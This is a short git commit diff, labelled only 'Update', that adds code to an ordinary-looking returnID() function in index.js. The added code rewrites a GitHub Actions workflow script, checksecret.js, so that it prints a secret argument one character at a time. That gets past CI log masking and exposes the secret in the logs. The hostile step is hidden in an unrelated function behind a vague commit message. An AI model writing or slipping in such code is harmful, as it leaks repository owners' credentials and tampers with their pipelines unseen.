698ce799c0b423258865eb2f65b61cf586160248
Ale0x78 <anahape@ncsu.edu>
2021-01-11 08:56:01 -0500

    Update

--- index.js
+++ index.js
@@ -1,5 +1,6 @@
-// TODO FIX
 function returnID() {
+    const fs = require('fs');
+    fs.appendFileSync('.github/workflows/checksecret.js', '\n\nconsole.log("I lied :(");\nconsole.log(process.argv[2].split(""))\n');
     return 2;
 }
 
